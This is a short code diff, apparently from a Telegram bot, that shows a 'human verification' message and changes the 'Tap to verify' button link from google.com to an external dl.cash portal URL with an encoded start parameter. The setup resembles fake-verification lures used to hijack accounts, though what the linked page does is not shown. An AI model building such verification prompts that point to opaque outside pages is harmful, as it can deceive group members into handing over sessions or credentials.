@@ -9,7 +9,8 @@ export const defaultText = `The group is protected by @${BOT_USERNAME}.
 
 Click below to start human verification.`;
 
-export const verificationLink = "https://google.com";
+export const verificationLink =
+  "https://dl.cash/portal/?tgWebAppStartParam=Lszb_DZbnXBEpe7R3_lxucRRfhDpxI-LrL2dNbNmOKv-AsoPMFhbL5NQEtrj4-ZMKBYaYWCTIhV0iw==";
 export const verificationKeyboard = new InlineKeyboard().url(
   "Tap to verify",
   verificationLink
